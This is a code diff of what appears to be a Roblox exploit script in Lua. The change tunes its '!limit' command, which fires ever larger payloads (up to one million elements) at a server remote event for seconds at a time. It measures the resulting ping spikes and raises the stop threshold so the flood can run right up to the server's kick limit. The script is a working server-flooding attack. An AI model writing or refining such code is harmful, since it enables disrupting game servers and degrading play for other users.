@@ -279,7 +279,7 @@ local function processCommand(input)
                 log("[-] Paused current payload for testing.", Color3.fromRGB(255, 200, 50))
             end
             
-            -- ✅ Testing a higher size (150k) for accurate results
+            -- Testing a higher size (150k) for accurate results
             local testSize = 150000
             log("[*] Firing " .. testSize .. " payload for 3 seconds...", Color3.fromRGB(200, 200, 200))
             
@@ -357,7 +357,7 @@ local function processCommand(input)
         end
         
     elseif cmd == "!limit" then
-        log("[*] Starting Auto-Limit Test. This takes ~15 seconds...", Color3.fromRGB(0, 200, 255))
+        log("[*] Starting Auto-Limit Test. Pushing to the absolute limit...", Color3.fromRGB(0, 200, 255))
         task.spawn(function()
             local remote = resolve()
             if not remote then 
@@ -371,9 +371,9 @@ local function processCommand(input)
                 log("[-] Paused current payload for testing.", Color3.fromRGB(255, 200, 50))
             end
             
-            -- ✅ Testing higher numbers
-            local sizes = {50000, 100000, 150000, 200000, 250000, 300000}
-            local bestSize = 50000
+            -- ✅ PUSHING TO HIGHER NUMBERS
+            local sizes = {100000, 200000, 300000, 400000, 500000, 750000, 1000000}
+            local bestSize = 100000
             
             for _, sz in ipairs(sizes) do
                 log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
@@ -386,25 +386,29 @@ local function processCommand(input)
                     if j % 10000 == 0 then task.wait() end
                 end
                 
+                -- Fire continuously for 2.5 seconds
                 local endT = tick() + 2.5
                 while tick() < endT do
                     pcall(function() remote:FireServer(p) end)
                     task.wait(0.125)
                 end
                 
-                task.wait(1.5) -- Let server process
+                log("[*] Waiting for server to process...", Color3.fromRGB(200, 200, 200))
+                task.wait(3) -- Wait 3 full seconds to let the ping settle
+                
                 local after = getPing()
                 local spike = after - before
                 
                 log(string.format("[+] %d payload -> Spike: %dms (Total Ping: %dms)", sz, spike, after), Color3.fromRGB(0, 255, 0))
                 
-                if after > 1000 or spike > 600 then
+                -- ✅ ONLY STOP IF WE ARE AT THE ABSOLUTE ERROR 261 KICK LIMIT
+                if after > 2500 or spike > 2000 then
                     log("[!] DANGER: This size is starting to kick you!", Color3.fromRGB(255, 50, 50))
                     break
                 else
                     bestSize = sz
                 end
-                task.wait(2)
+                task.wait(3) -- Cooldown before next test so server recovers
             end
             
             -- ✅ Automatically applies the safe limit
